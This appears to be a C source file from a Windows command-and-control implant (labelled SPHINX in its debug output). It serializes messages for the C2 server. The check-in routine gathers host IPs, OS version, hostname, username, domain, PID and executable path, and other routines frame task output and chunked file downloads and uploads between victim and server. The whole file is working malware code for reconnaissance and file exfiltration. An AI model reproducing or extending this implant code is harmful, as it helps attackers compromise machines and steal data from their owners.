// Packer: builds big-endian TLV buffers to send to the C2. Mirror image of the parser.

#include <stdint.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#define SECURITY_WIN32
#include <secext.h>
#include "../Include/packer.h"

// Write 1 byte at buf[*offset]. Advances *offset by 1.
void pack_byte(uint8_t* buf, size_t* offset, uint8_t value) {
    buf[(*offset)++] = value;
}

// Write a uint32 as 4 big-endian bytes. Advances *offset by 4.
void pack_u32(uint8_t* buf, size_t* offset, uint32_t value){
    buf[(*offset)++] = value >> 24;
    buf[(*offset)++] = value >> 16;
    buf[(*offset)++] = value >> 8;
    buf[(*offset)++] = value;
}

// Pack a length-prefixed byte array: [4B big-endian len][data]. Advances *offset by 4 + len.
void pack_bytes(uint8_t* buf, size_t* offset, const uint8_t* data, size_t len) {
    pack_u32(buf, offset, (uint32_t) len);
    memcpy(buf + *offset, data,len);
    *offset += len;
}

// Convenience wrapper around pack_bytes for null-terminated strings.
void pack_string(uint8_t* buf, size_t* offset, const char* str) {
    size_t len = strlen(str);
    pack_bytes(buf, offset, (const uint8_t*) str, len);
}

// Build a task response block: type byte (0xA4), task_uuid (36 bytes),
// output (length-prefixed), and status byte.
void pack_task_response(uint8_t* buf, size_t* offset,
                        const char* task_uuid,
                        const uint8_t* output, size_t output_len,
                        uint8_t status) {
    pack_byte(buf, offset, MSG_TASK_RESPONSE);
    memcpy(buf + *offset, task_uuid, 36);
    *offset += 36;
    pack_bytes(buf, offset, output, output_len);
    pack_byte(buf, offset, status);
}

// Initialise the outer message envelope by writing the task count as a UINT32.
// Individual task responses are appended afterwards via pack_task_response.
void pack_post_response_start(uint8_t* buf, size_t* offset, uint32_t num_tasks) {
    pack_u32(buf, offset, num_tasks);
}

// Helper: wide string (WCHAR*) to UTF-8.
void WideToUTF(const WCHAR* str, char* utf, int size) {
    WideCharToMultiByte(
        CP_UTF8,
        0,
        str,
        -1,     // null-terminated input
        utf,
        size,
        NULL, NULL
    );
}

/**
 * Pack a full check-in message with host metadata.
 *
 * Wire layout (fields written in order):
 *
 * [36B temp_uuid]           -- raw bytes, no length prefix
 *
 * IPs -- GetAdaptersAddresses(AF_INET, ...)
 * [4B num_ips]
 * [4B ip0] [4B ip1] ...     -- each IP in network byte order
 *
 * [OS string]               -- pack_string("Major.Minor (build N)")
 * [1B arch]                 -- 0x64 = x64, 0x86 = x86
 * [hostname string]
 * [username string]
 * [domain string]
 * [4B PID]
 * [process name string]
 * [external IP string]      -- "0.0.0.0" placeholder
 */
void pack_checkin(_Inout_ uint8_t* buf, _Inout_ size_t* offset, _In_ const char* temp_uuid) {
    /* uuid: fixed 36 bytes, NO length prefix (translator expects this) */
    memcpy(buf + *offset, temp_uuid, 36);
    *offset += 36;
    fprintf(stderr, "[SPHINX] uuid packed\n");

    /* IP info */
    ULONG buf_address_size = 0;
    GetAdaptersAddresses(AF_INET, 0, NULL, NULL, &buf_address_size); // first call: get required buffer size
    fprintf(stderr, "[SPHINX] GetAdaptersAddresses size=%lu\n", buf_address_size);
    PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES) malloc(buf_address_size);

    if (adapters != NULL && GetAdaptersAddresses(AF_INET, 0, NULL, adapters, &buf_address_size) == ERROR_SUCCESS) {
        uint32_t ip_count = 0;
        for (PIP_ADAPTER_ADDRESSES a = adapters; a != NULL; a = a->Next) {
            if (a->OperStatus != IfOperStatusUp) continue; // skip adapters that are not up
            for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua != NULL; ua = ua->Next) {
                ip_count++;
            }
        }
        pack_u32(buf, offset, ip_count); // 4B ip count

        for (PIP_ADAPTER_ADDRESSES a = adapters; a != NULL; a = a->Next) {
            if (a->OperStatus != IfOperStatusUp) continue;

        for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua != NULL; ua = ua->Next) {
            SOCKADDR_IN* addr = (SOCKADDR_IN*)ua->Address.lpSockaddr;
            /* S_addr is already in network byte order in memory:
               copy the 4 bytes as-is (192.168.14.129 → c0 a8 0e 81) */
            memcpy(buf + *offset, &addr->sin_addr.S_un.S_addr, 4);
            *offset += 4;
        }
        }
        free(adapters);
    } else {
        if (adapters) free(adapters);
        pack_u32(buf, offset, 0); // on failure send 0 IPs to preserve TLV framing
    }

    /* OS info */
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    BOOL os_packed = FALSE;

    if (hMod) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr) GetProcAddress(hMod, "RtlGetVersion");
        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOEXW osInfo = { 0 };
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            if (pRtlGetVersion(&osInfo) == 0) {
                char os_str[64];
                // Windows 10 and Windows 11 both report Major=10.
                // Build >= 22000 distinguishes Windows 11.
                if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 22000) {
                    sprintf(os_str, "Windows 11.%lu (build %lu)",
                    osInfo.dwMinorVersion,
                    osInfo.dwBuildNumber);
                } else {
                    sprintf(os_str, "Windows %lu.%lu (build %lu)",
                    osInfo.dwMajorVersion,
                    osInfo.dwMinorVersion,
                    osInfo.dwBuildNumber);
                }
                pack_string(buf, offset, os_str);
                os_packed = TRUE;
            }
        }
    }
    if (!os_packed) pack_string(buf, offset, "Unknown OS"); // mandatory fallback

    /* Architecture */
    #ifdef _WIN64
        pack_byte(buf, offset, 0x64);
    #else
        pack_byte(buf, offset, 0x86);
    #endif

    /* General info */
    WCHAR compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(compName, &compSize)) {
        char comp_utf8[256];
        WideToUTF(compName, comp_utf8, sizeof(comp_utf8));
        pack_string(buf, offset, comp_utf8);
    }else pack_string(buf, offset, "Unknown Host");

    WCHAR userName[UNLEN + 1];
    DWORD userSize = UNLEN + 1;
    if (GetUserNameW(userName, &userSize)) {
        char user_utf8[256];
        WideToUTF(userName, user_utf8,sizeof(user_utf8));
        pack_string(buf, offset, user_utf8);
    }else pack_string(buf, offset, "Unknown User");

    ULONG domBuf = 0;
    GetUserNameExW(NameSamCompatible, NULL, &domBuf);
    if (domBuf > 0) {
        LPWSTR domName = (LPWSTR)malloc(domBuf * sizeof(WCHAR));
        if (domName != NULL && GetUserNameExW(NameSamCompatible, domName, &domBuf)) {
            char dom_utf8[256];
            WideToUTF(domName, dom_utf8, sizeof(dom_utf8));
            pack_string(buf, offset, dom_utf8);
        } else {
            pack_string(buf, offset, "Unknown Domain");
        }
        if (domName) free(domName);
    } else pack_string(buf, offset, "Workgroup"); // fallback when not domain-joined

    /* Process info */
    pack_u32(buf, offset, GetCurrentProcessId()); // 4B PID
    fprintf(stderr, "[SPHINX] general info ok\n");

    WCHAR pathName[1024];
    if (GetModuleFileNameW(NULL, pathName, 1024)) {
        char path_utf8[4096];
        WideToUTF(pathName, path_utf8, sizeof(path_utf8));
        pack_string(buf, offset, path_utf8);
    }else pack_string(buf, offset, "Unknown Path");

    pack_string(buf, offset, "0.0.0.0");
    fprintf(stderr, "[SPHINX] pack_checkin done, offset=%d\n", (int)*offset);
}

void pack_download_init(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t total_chunks, const char* full_path, uint32_t chunk_size) {
    pack_byte(buf, off, MSG_DOWNLOAD_INIT);
    memcpy(buf + *off, task_uuid, 36); *off += 36;      // uuid without length prefix
    pack_u32(buf, off, total_chunks);
    pack_string(buf, off, full_path);                    // [4B len + bytes]
    pack_u32(buf, off, chunk_size);
}

void pack_download_cont(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t chunk_num, const char* file_id,
                        const uint8_t* data, uint32_t len, uint32_t chunk_size) {
    pack_byte(buf, off, MSG_DOWNLOAD_CONT);
    memcpy(buf + *off, task_uuid, 36); *off += 36;
    pack_u32(buf, off, chunk_num);
    memcpy(buf + *off, file_id, 36);   *off += 36;       // file_id raw
    pack_bytes(buf, off, data, len);                      // [4B len + bytes]
    pack_u32(buf, off, chunk_size);
}

void pack_upload_pull(uint8_t* buf, size_t* off, const char* task_uuid, uint32_t chunk_num, const char* file_id,
                      const char* full_path, uint32_t chunk_size) {
    pack_byte(buf, off, MSG_UPLOAD_PULL);
    memcpy(buf + *off, task_uuid, 36); *off += 36;
    pack_u32(buf, off, chunk_num);
    memcpy(buf + *off, file_id, 36);   *off += 36;
    pack_string(buf, off, full_path);
    pack_u32(buf, off, chunk_size);
}
